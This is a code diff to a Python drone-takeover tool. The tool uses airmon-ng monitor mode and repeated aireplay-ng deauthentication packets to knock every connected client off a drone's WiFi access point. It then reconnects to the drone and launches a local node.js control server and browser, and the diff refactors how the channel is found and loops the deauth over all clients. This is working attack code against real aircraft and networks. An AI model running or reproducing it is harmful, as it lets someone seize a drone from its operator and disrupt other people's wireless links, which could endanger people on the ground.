@@ -17,6 +17,20 @@ def stop_airmon(iface_mon):
     os.system(cmd)
     # os.system("sudo service NetworkManager start")
 
+#return the channel of the wifi Connection
+# def find_channel(mac_drone):
+#     with open("drone_list-01.csv", newline="") as file:
+#         reader = csv.reader(file)
+#         for row in reader:
+#             n = len(row)
+#             if n == 15:
+#                 if re.search(mac_drone,row[0]):
+#                     channel = row[3]
+#     cmd = "sudo rm drone_list-0*"
+#     os.system(cmd)
+#     return channel
+
+
 #find info about the UAV AP
 def scan_wifi(iface_mon, drone):
     #file of UAV's info
@@ -30,31 +44,27 @@ def scan_wifi(iface_mon, drone):
     except Exception as e:
         print("Can't run airodump-ng")
 
-#return the channel of the wifi Connection
-def find_channel(mac_drone):
-    with open("drone_list-01.csv", newline="") as file:
-        reader = csv.reader(file)
-        for row in reader:
-            n = len(row)
-            if n == 15:
-                if re.search(mac_drone,row[0]):
-                    channel = row[3]
-    cmd = "sudo rm drone_list-0*"
-    os.system(cmd)
+#find channel of wifi connection
+def find_channel(iface):
+    cmd="iwlist {} channel | grep -o -E  '[[:xdigit:]]+)' | grep -o -E [[:xdigit:]]+".format(iface)
+    ret = os.popen(cmd)
+    channel = int(ret.read())
     return channel
 
-def eject_client(client, mac_drone, drone_essid, iface_mon):
-    channel = find_channel(mac_drone)
+def eject_client(client_list, mac_drone, drone_essid, iface_mon, channel):
     os.system("sudo iwconfig {0} channel {1}".format(iface_mon, channel))
-    cmd = "sudo aireplay-ng -0 1 -e {3} -a {0} -c {1} {2} >>/dev/null 2>>/dev/null".format(mac_drone, client.mac, iface_mon, drone_essid)
     for i in range(10):
-        os.system(cmd)
+        for client in client_list:
+            # print("{}Trying to eject {}\n{}".format(GREEN, client.mac, WHITE))
+            cmd = "sudo aireplay-ng -0 1 -e {3} -a {0} -c {1} {2} >>/dev/null 2>>/dev/null".format(mac_drone, client.mac, iface_mon, drone_essid)
+            os.system(cmd)
+
 
 def demote():
     os.seteuid(1000)
 
 def launch_server():
-    cmd = "cd drone-browser && node server.js >>/dev/null 2>>/dev/null &"
+    cmd = "cd drone-browser && node server.js >>/dev/null 2>>/dev/null "
     cmd2 = "firefox localhost:3001"
     #os.system(cmd)
     server = subprocess.Popen(cmd, shell=True)
@@ -80,16 +90,15 @@ def take_control_main(drone, iface):
     else:
         mac_drone = drone.bssid
         drone_essid = drone.essid
-        iface_mon = iface+"mon"
-        start_airmon(iface)
-        for client in client_list:
-            try :
-                print("{}Trying to eject {}\n{}".format(GREEN, client.mac, WHITE))
-                scan_wifi(iface_mon,drone)
-                eject_client(client, mac_drone, drone_essid, iface_mon)
-            except:
-                print("{}ERROR{}:No client connected{}".format(RED,GREEN, WHITE))
-        stop_airmon(iface_mon)
+        # iface_mon = iface+"mon"
+        # scan_wifi(iface_mon,drone)
+        try :
+            channel = find_channel(iface)
+            start_airmon(iface)
+            eject_client(client_list, mac_drone, drone_essid, iface_mon, channel)
+            stop_airmon(iface_mon)
+        except:
+            print("{}ERROR{}:No client connected{}".format(RED,GREEN, WHITE))
         connect_to_uav(drone, iface)  #re-connection to the UAV
         serv = launch_server()
 
@@ -99,7 +108,7 @@ def take_control_main(drone, iface):
         choice = input(header)
 
         if choice.upper() == 'S' or choice.upper() == 'STOP':
-            #os.system("sudo killall node") #clean the nodejs server. Be carrefull if other node js are running
+            os.system("sudo killall node".format(serv.pid)) #clean the nodejs server. Be carrefull if other node js are running
             serv.terminate()
             os.system("clear")
             #firefox.terminate()
